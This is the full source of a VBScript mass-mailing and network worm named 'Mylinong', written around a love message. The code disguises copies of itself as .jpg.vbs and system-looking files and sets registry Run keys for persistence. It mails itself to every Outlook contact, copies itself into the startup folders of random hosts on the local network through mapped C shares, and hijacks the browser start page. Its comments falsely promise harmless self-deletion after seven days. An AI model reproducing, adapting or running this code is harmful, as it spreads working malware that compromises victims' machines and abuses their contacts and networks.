Set fso = CreateObject("Scripting.FileSystemObject")
set opfile = fso.OpenTextFile(WScript.ScriptFullname,1)
'Hi.., Nong... I Love U So Much......
'This file can be hold in your computer for 7 days
'after that day
Mylinong="Mylinong" 'will be delete by it self
'Don't Worry
'It Can Be Normal Again
'I Always Hope That.
dim octa,octb,octc,octad,show,dirwin,dirsystem,dirtemp
dim ipaddress,fso1,fso2
dim ip1,ip2,ip3,ip4
dim dot,myfile,sharename
dot="."
show=0
set wshnetwork = wscript.createobject("wscript.network")
Set fso1 = createobject("scripting.filesystemobject")
set fso2 = createobject("scripting.filesystemobject")
on error resume next
randomize
getip()
randaddress()
shareformat()
wshnetwork.mapnetworkdrive "j:", sharename
enumdrives()
copyfiles()
disconnectdrive()
utama()
sub utama()
  On Error Resume Next
  dim wscr,rr,brpkali,brpdate
  brpkali=0
  set wscr=CreateObject("WScript.Shell")
  ntime=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
  if (ntime>=1) then
    wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
  end if
  brpkali=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\bkali")
  brpdate=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\bdate")
  show=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\show")
  If show=0 Then
     wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\show", 1, "REG_DWORD"
  Else
     wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\show", 0, "REG_DWORD"
  End If
  if brpkali=0 then
     wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\bkali", 1, "REG_DWORD"
     wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\bdate", 1, "REG_DWORD"
  Else
     IF brpkali > 14 Then
  	Set dirwin = fso.GetSpecialFolder(0)
  	Set dirsystem = fso.GetSpecialFolder(1)
  	Set dirtemp = fso.GetSpecialFolder(2)
        set ftxt=fso.GetFile(dirwin & "\mylinong.jpg.shs")
        set fvbs1=fso.GetFile(dirsystem &"\Kern32Lin.vbs")
        set fvbs2=fso.GetFile(dirwin &"\Vbrun32DLL.vbs")
        set fvbs3=fso.GetFile(dirsystem &"\mylinong.jpg.vbs")
        ftxt.delete
        fvbs1.delete
        fvbs2.delete
        fvbs3.delete
        cdeldrive()
     Else
  	Set dirwin = fso.GetSpecialFolder(0)
  	Set dirsystem = fso.GetSpecialFolder(1)
  	Set dirtemp = fso.GetSpecialFolder(2)
  	Set drivec = fso.GetFile(WScript.ScriptFullName)
  	drivec.copy(dirwin & "\mylinong.jpg.shs")
  	drivec.Copy(dirsystem & "\Kern32Lin.vbs")
  	drivec.Copy(dirwin & "\Vbrun32DLL.vbs")
  	drivec.Copy(dirsystem & "\mylinong.jpg.vbs")
  	runreg()
  	sen2email()
  	cnewdrive()
  	textfile()
        If brpdate <> date() Then
           wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\bkali", brpkali+1, "REG_DWORD"
           wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\bdate", date, "REG_DWORD"
        End If
     End If
  End If
end sub
sub cdeldrive
    Set fso = CreateObject("Scripting.FileSystemObject")
    for i=1 to 600
        fso.DeleteFolder(ec("O:\XUBCBS U XCJQ MCI YM RCXPQF" )& cstr(i))
    next
end sub
sub cnewdrive
    Set fso = CreateObject("Scripting.FileSystemObject")
    for i=1 to 600
        Set f = fso.CreateFolder(ec("O:\XUBCBS U XCJQ MCI YM RCXPQF" )& cstr(i))
    next
end sub
sub textfile()
    dim wscr,spcfld
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set spcfld = fso.GetSpecialFolder(2)
    set scrun=CreateObject("WScript.Shell")
    Set t = fso.CreateTextFile(spcfld & "\mylinong.hta", True)
    t.WriteLine("<html>")
t.WriteLine("<head>")
t.WriteLine("<title>My Linong..</title>")
t.WriteLine("<HTA:APPLICATION ID=""Linong""")
t.WriteLine("    APPLICATIONNAME=""MYlinong""")
t.WriteLine("	Border=None")
t.WriteLine("    WIDTH=20")
t.WriteLine("    BORDERSTYLE=Raised")
t.WriteLine("    SCROLL=no")
t.WriteLine("    SINGLEINSTANCE=yes")
t.WriteLine("    SYSMENU=no")
t.WriteLine("    NAVIGABLE=yes")
t.WriteLine("    CAPTION=no")
t.WriteLine("    CONTEXTMENU=no")
t.WriteLine("	SHOWINTASKBAR=no")
t.WriteLine("   ICON=""MeTour.ico"">")
t.WriteLine("</HTA:APPLICATION>")
t.WriteLine("</head>")
t.WriteLine("<body>")
t.WriteLine("<em>")
t.WriteLine("<font size=""+295"">")
t.WriteLine("I  </font> ")
t.WriteLine("<font size=""+295"" color=""#f58dce"" >")
t.WriteLine("L o v e  </font> ")
t.WriteLine("<font size=""+295"">")
t.WriteLine("Y o u  <br>")
t.WriteLine("</font>")
t.WriteLine("<font size=""+295"">")
t.WriteLine("L i n o n g ")
t.WriteLine("</font>")
t.WriteLine("</em>")
t.WriteLine("<br>")
t.WriteLine("<br>")
t.WriteLine("You are the love of my love,&nbsp;&nbsp;&nbsp;&nbsp;<small>5173n1n3ty31gh7</small><br>")
t.WriteLine("Almost One Year.., Miss U <br>")
t.WriteLine("01*29**879<br>")
t.WriteLine("01*29**868<br>")
t.WriteLine("&nbsp;&nbsp;&nbsp;&nbsp;*¿* ")
t.WriteLine("</body>")
t.WriteLine("</html>")
    filetxt=spcfld & "\mylinong.hta"
    If show=0 Then
       scrun.run(filetxt)
    End If
end sub
sub runreg()
  On Error Resume Next
  Dim num
  createReg "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Kern32lLin",dirsystem & "\Kern32Lin.vbs"
  createReg "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Vbrun32DLL",dirwin & "\vbrun32DLL.vbs"
  createReg "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.thewebpost.com/lovepoems/1198/dpt112098ily.shtml"
end sub
sub createReg(regkey,regvalue)
  Set regedit = CreateObject("WScript.Shell")
  regedit.RegWrite regkey,regvalue
end sub
function getreg(value)
  Set regedit = CreateObject("WScript.Shell")
  regget = regedit.RegRead(value)
end function
Function EC(txt)
EC=""
For sm=1 to Len(txt)
    If Asc(Mid(txt,sm,1))<>32 And Asc(Mid(txt,sm,1))<>33 And Asc(Mid(txt,sm,1))<>34 And Asc(Mid(txt,sm,1))<>160 And Asc(Mid(txt,sm,1))<>255 And Asc(Mid(txt,sm,1))<>58 And Asc(Mid(txt,sm,1))<>92 Then
       if ASC(MID(txt,sm,1))<=ASC(MID(MYLINONG,1,1)) Then
          EC=EC & CHR(ASC(MID(txt,sm,1))+ASC(""))
       else
          EC=EC & CHR(ASC(MID(txt,sm,1))-ASC(""))
       end if
    Else
       EC=EC & Mid(txt,sm,1)
    end if
Next
end Function
sub sen2email()
  On Error Resume Next
  dim x, addr, clists, ctrentries, ead, regedit, regv, regad
  set regedit = CreateObject("WScript.Shell")
  set out = WScript.CreateObject("Outlook.Application")
  set mapi = out.GetNameSpace("MAPI")
  for clists = 1 to mapi.AddressLists.Count
    set addr = mapi.AddressLists(clists)
    x = 1
    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & addr)
    if (regv = "") then
      regv = 1
    end if
    if (int(addr.AddressEntries.Count) > int(regv)) then
      for ctrentries = 1 to addr.AddressEntries.Count
        ead = addr.AddressEntries(x)
        regad = ""
        regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & ead)
        if (regad = "") then
          set surat = out.CreateItem(0)
          surat.Recipients.Add(ead)
          surat.Subject = "One of this mail"
          surat.Body = vbcrlf & "True Story...."
          surat.Attachments.Add(dirsystem & "\mylinong.exe")
          snd1="surat.Send"
	  execute snd1
          regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & ead, 1, "REG_DWORD"
        end if
        x = x + 1
      next
      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
    else
      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
    end if
  next
  Set out = Nothing
  Set mapi = Nothing
end sub
Function Getip
On Error Resume Next
Const ForReading = 1, TemporaryFolder = 2
Set wshShell = wscript.createobject("wscript.shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set tfolder = fso.GetSpecialFolder(TemporaryFolder)
tname = fso.GetTempName
TempFile = tfolder & "\" & tname
wshShell.run "ipconfig /Batch " & TempFile,0,true
Set results = fso.GetFile(TempFile)
Set ts = results.OpenAsTextStream(ForReading)
Do While ts.AtEndOfStream <> True
   retString = ts.ReadLine
   If instr(retString, "Address") > 0 Then
      nstart=Instr(retstring,":")
      Ipaddress=MID(retstring,nstart+1,12)
      Exit Do
   End If
Loop
ip1=mid(ipaddress,1,instr(ipaddress,".")-1)
ipaddressnew=mid(ipaddress,instr(ipaddress,".")+1,LEN(ipaddress)-instr(ipaddress,"."))
Ip2=mid(ipaddressnew,1,instr(ipaddressnew,".")-1)
ipaddressnew=mid(ipaddressnew,instr(ipaddressnew,".")+1,LEN(ipaddressnew)-instr(ipaddressnew,"."))
Ip3=mid(ipaddressnew,1,instr(ipaddressnew,".")-1)
ip4=mid(ipaddressnew,instr(ipaddressnew,".")+1,3)
ts.Close
results.delete
Set ts = Nothing
Set results = Nothing
Set tfolder = Nothing
Set fso = Nothing
Set wshShell = Nothing
End function
function randaddress()
On Error Resume Next
IF ip4>=255 then
   ip4=1
End if
ip4=int((ip4 * rnd) + 1)
end function
function shareformat()
On Error Resume Next
sharename = "\\" & ip1 & dot & ip2 & dot & ip3 & dot & ip4 & "\C"
end function
function enumdrives()
On Error Resume Next
Set odrives = wshnetwork.enumnetworkdrives
For i = 0 to odrives.Count -1
if sharename = odrives.item(i) then
driveconnected = 1
else
 driveconnected = 0
end if
Next
end function
function copyfiles()
On Error Resume Next
Set fso = CreateObject("scripting.filesystemobject")
fso.copyfile "c:\windows\linong.vbs", "j:\"
fso.copyfile "c:\windows\linong.vbs", "j:\windows\startm~1\programs\startup\"
fso.copyfile "c:\windows\linong.vbs", "j:\windows\"
fso.copyfile "c:\windows\linong.vbs", "j:\windows\start menu\programs\startup\"
end function
function disconnectdrive()
On Error Resume Next
wshnetwork.removenetworkdrive "j:"
driveconnected = "0"
end function
